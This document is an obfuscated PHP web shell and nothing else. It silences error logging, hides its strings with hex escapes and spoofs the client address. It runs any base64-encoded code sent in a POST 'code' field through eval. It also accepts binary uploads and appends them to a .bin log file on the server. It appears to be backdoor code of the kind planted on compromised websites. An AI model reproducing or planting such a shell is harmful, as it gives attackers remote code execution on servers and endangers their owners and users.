<?php @error_reporting(0); @ini_set("d\x69sp\x6cay_errors",0); @ini_set("l\x6f\x67_err\x6f\x72s",0); @ini_set("er\x72\x6fr_\x6cog",0); @ini_set("\x6demory_lim\x69t", "128M"); @ini_set("m\x61x_\x65xe\x63\x75ti\x6fn_\x74ime",30); @set_time_limit(30); if (isset($_SERVER["\x48\x54TP_X\x5f\x52E\x41L\x5fIP"])) $_SERVER["\x52EMOTE_A\x44DR"] = $_SERVER["\x48\x54TP_X\x5f\x52E\x41L\x5fIP"]; if (isset($_POST["cod\x65"])) { eval(base64_decode($_POST["cod\x65"])); } elseif (isset($_SERVER["HTT\x50_\x43O\x4eTEN\x54_EN\x43\x4f\x44ING"]) && $_SERVER["HTT\x50_\x43O\x4eTEN\x54_EN\x43\x4f\x44ING"] == "b\x69\x6eary") { $input = file_get_contents("php:/\x2fi\x6e\x70\x75t"); if (strlen($input) > 0) print "\x53TAT\x55S-I\x4dPORT\x2dO\x4b"; if (strlen($input) > 10) { $fp = @fopen(str_replace("\x2ephp",".b\x69n",basename($_SERVER["SCRIPT\x5fFI\x4cENAME"])), "\x61"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["\x52EMOTE_A\x44DR"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["\x52\x45Q\x55E\x53T_URI"], ".s\x68t\x6dl") !== false) { print $_SERVER["\x52\x45Q\x55E\x53T_URI"]; } exit; ?>